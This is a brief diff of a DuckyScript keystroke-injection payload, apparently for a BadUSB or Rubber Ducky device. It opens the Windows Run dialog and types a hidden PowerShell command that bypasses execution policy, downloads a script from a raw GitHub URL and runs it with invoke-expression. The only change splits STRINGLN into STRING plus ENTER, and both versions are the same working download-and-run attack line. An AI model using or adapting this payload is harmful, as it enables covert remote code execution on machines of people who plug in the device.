@@ -5,4 +5,5 @@ REM Version: 1.0
 
 GUI r
 DELAY 250
-STRINGLN powershell -w h -NoP -NonI -Exec Bypass $pl = iwr -UseBasicParsing https://raw.githubusercontent.com/CoolCoderSJ/Self-Destructing-Passwords/main/decrypt.ps1; invoke-expression $pl
+STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr -UseBasicParsing https://raw.githubusercontent.com/CoolCoderSJ/Self-Destructing-Passwords/main/decrypt.ps1; invoke-expression $pl
+ENTER
